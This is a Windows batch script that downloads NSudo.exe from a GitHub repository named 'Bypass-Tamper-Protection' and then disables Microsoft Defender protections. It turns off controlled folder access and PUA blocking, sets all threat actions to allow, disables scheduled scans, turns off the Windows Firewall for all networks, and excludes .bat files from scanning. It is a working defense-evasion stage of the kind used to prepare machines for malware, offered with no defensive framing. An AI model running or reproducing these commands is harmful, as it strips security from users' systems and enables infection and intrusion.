REM- our tool for authorization
bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe

REM- We disable the controlled file approach
powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"

REM- to make potentially unwanted applications accept
powershell.exe -command "Set-MpPreference -PUAProtection disable"

REM- Allows threatening actions
powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"

powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
      
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
REM-https://docs.microsoft.com/en-us/windows/win32/lwef/mpthreat-action

REM- Turn off Windows Firewall for all networks
powershell.exe -command "netsh advfirewall set allprofiles state off"

REM-  We ensure that .bat files are not scanned
powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat'"
